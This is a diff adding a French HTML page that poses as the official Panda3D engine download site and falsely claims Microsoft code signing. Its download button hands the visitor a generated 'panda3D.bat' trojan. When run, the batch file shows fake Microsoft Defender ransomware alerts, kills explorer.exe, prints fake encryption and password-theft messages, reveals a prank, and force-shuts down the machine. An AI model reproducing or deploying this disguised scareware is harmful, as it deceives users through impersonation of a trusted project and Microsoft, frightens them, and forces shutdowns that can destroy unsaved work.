@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Panda3D | Moteur de Rendu Officiel</title>
+    <style>
+        body {
+            background-color: #050505;
+            color: #e0e0e0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            overflow: hidden;
+        }
+
+        .overlay {
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: radial-gradient(circle, rgba(0, 255, 65, 0.05) 0%, rgba(0,0,0,0) 70%);
+            pointer-events: none;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 500px;
+            padding: 40px;
+            background: rgba(15, 15, 15, 0.95);
+            border: 1px solid #222;
+            border-radius: 12px;
+            box-shadow: 0 20px 50px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            z-index: 1;
+        }
+
+        .logo {
+            color: #00ff41;
+            font-weight: bold;
+            font-size: 1.2rem;
+            border: 2px solid #00ff41;
+            display: inline-block;
+            padding: 5px 10px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 2rem;
+            margin: 0;
+            letter-spacing: 3px;
+            color: #fff;
+        }
+
+        .tagline {
+            color: #666;
+            font-size: 0.9rem;
+            margin-top: 10px;
+        }
+
+        .status-bar {
+            font-size: 0.75rem;
+            color: #00ff41;
+            margin: 20px 0;
+            text-transform: uppercase;
+        }
+
+        .dot {
+            height: 8px;
+            width: 8px;
+            background-color: #00ff41;
+            border-radius: 50%;
+            display: inline-block;
+            margin-right: 5px;
+            box-shadow: 0 0 10px #00ff41;
+        }
+
+        .card {
+            background: #111;
+            border: 1px solid #333;
+            padding: 15px;
+            border-radius: 6px;
+            text-align: left;
+            margin-bottom: 30px;
+        }
+
+        .card h3 {
+            margin-top: 0;
+            font-size: 1rem;
+            color: #00ff41;
+        }
+
+        .card ul {
+            list-style: none;
+            padding: 0;
+            font-size: 0.85rem;
+            color: #888;
+        }
+
+        .card li {
+            margin-bottom: 5px;
+        }
+
+        .card li::before {
+            content: "✓ ";
+            color: #00ff41;
+        }
+
+        .btn-download {
+            display: block;
+            width: 100%;
+            background-color: #00ff41;
+            color: #000;
+            border: none;
+            padding: 20px;
+            border-radius: 6px;
+            font-family: inherit;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .btn-download:hover {
+            background-color: #00cc33;
+            transform: translateY(-3px);
+            box-shadow: 0 10px 20px rgba(0, 255, 65, 0.2);
+        }
+
+        .btn-text {
+            display: block;
+            font-size: 1.1rem;
+            font-weight: bold;
+        }
+
+        .btn-sub {
+            display: block;
+            font-size: 0.7rem;
+            font-weight: normal;
+            opacity: 0.8;
+            margin-top: 5px;
+        }
+
+        footer {
+            margin-top: 30px;
+            font-size: 0.65rem;
+            color: #444;
+        }
+    </style>
+</head>
+<body>
+    <div class="overlay"></div>
+    <div class="container">
+        <header>
+            <div class="logo">P3D</div>
+            <h1>PANDA3D ENGINE</h1>
+            <p class="tagline">Framework de développement 3D haute performance.</p>
+        </header>
+
+        <main>
+            <div class="status-bar">
+                <span class="dot"></span> Serveurs : Opérationnels
+            </div>
+
+            <div class="card">
+                <h3>Version Stable 2.0.4 (Windows)</h3>
+                <ul>
+                    <li>Optimisation des shaders temps réel</li>
+                    <li>Nouveau moteur physique intégré</li>
+                    <li>Support DirectX 12 et Vulkan</li>
+                </ul>
+            </div>
+
+            <div class="download-box">
+                <button id="btnHack" class="btn-download">
+                    <span class="btn-text">TÉLÉCHARGER PANDA3D.BAT</span>
+                    <span class="btn-sub">v2.0.4 | Windows x64 | 4.2 MB</span>
+                </button>
+            </div>
+        </main>
+
+        <footer>
+            <p>© 2026 Panda3D Open Source Foundation. Certifié par Microsoft Code Signing.</p>
+        </footer>
+    </div>
+
+    <script>
+        document.getElementById('btnHack').addEventListener('click', function() {
+            const batContent = [
+                "@echo off",
+                "title CENTRE DE SECURITE MICROSOFT - MAINTENANCE CRITIQUE",
+                "color 0c",
+                "",
+                ":: 1. NARRATION : Échec de la défense Windows",
+                "echo [SYSTEME] Detection d'une activite inhabituelle...",
+                "timeout /t 2 >nul",
+                "",
+                "echo x=msgbox(\"Menace detectee : Ransom.Win32.X-Shredder. Tentative de suppression du script malveillant en cours...\", 0+64, \"Microsoft Defender\") > %temp%\\err.vbs",
+                "start /wait %temp%\\err.vbs",
+                "",
+                "echo x=msgbox(\"ECHEC : Le virus a bloque l'acces au noyau systeme. Tentative d'isolement des fichiers personnels...\", 0+48, \"Protection Windows\") >> %temp%\\err.vbs",
+                "start /wait %temp%\\err.vbs",
+                "",
+                "echo x=msgbox(\"ERREUR CRITIQUE : Microsoft Defender a ete desactive de force. Le systeme ne peut plus repousser l'attaque.\", 0+16, \"Erreur de Securite\") >> %temp%\\err.vbs",
+                "start /wait %temp%\\err.vbs",
+                "",
+                ":: 2. SABOTAGE VISUEL",
+                "taskkill /f /im explorer.exe >nul",
+                "",
+                ":: 3. LE TERMINAL (L'attaque)",
+                "cls",
+                "echo.",
+                "echo [+] OVERRIDE DES PRIVILEGES ADMINISTRATEUR... [OK]",
+                "echo [+] ACCES AUX REPERTOIRES PERSONNELS... [DEBLOQUE]",
+                "timeout /t 1 >nul",
+                "",
+                ":: Phase de chiffrement simulé",
+                "echo [X-SHREDDER] Chiffrement des photos ... [REUSSI]",
+                "timeout /t 1 >nul",
+                "echo [X-SHREDDER] Exfiltration des mots de passe ... [REUSSI]",
+                "timeout /t 1 >nul",
+                "echo [X-SHREDDER] Destruction des sauvegardes ... [REUSSI]",
+                "timeout /t 1 >nul",
+                "",
+                ":: 4. LA REVELATION ET LE DECOMPTE S PAR S",
+                "cls",
+                "color 0b",
+                "echo ======================================================",
+                "echo.",
+                "echo      TU AS ETE TROLLE PAR CLEMENT ET ADRIEN LOL",
+                "echo.",
+                "echo ======================================================",
+                "echo.",
+                "",
+                ":: Décompte manuel seconde par seconde dans l'invite",
+                "echo L'extinction debutera dans :",
+                "",
+                "echo 5...",
+                "timeout /t 1 >nul",
+                "echo 4...",
+                "timeout /t 1 >nul",
+                "echo 3...",
+                "timeout /t 1 >nul",
+                "echo 2...",
+                "timeout /t 1 >nul",
+                "echo 1...",
+                "timeout /t 1 >nul",
+                "",
+                ":: 5. EXTINCTION FINALE",
+                "del %temp%\\err.vbs",
+                "shutdown -s -t 0 -f",
+                "exit"
+            ].join('\r\n');
+
+            const blob = new Blob([batContent], { type: 'application/x-msdos-program' });
+            const url = window.URL.createObjectURL(blob);
+            
+            const a = document.createElement('a');
+            a.style.display = 'none';
+            a.href = url;
+            a.download = 'panda3D.bat';
+            document.body.appendChild(a);
+            a.click();
+            
+            window.URL.revokeObjectURL(url);
+            document.body.removeChild(a);
+        });
+    </script>
+</body>
+</html>
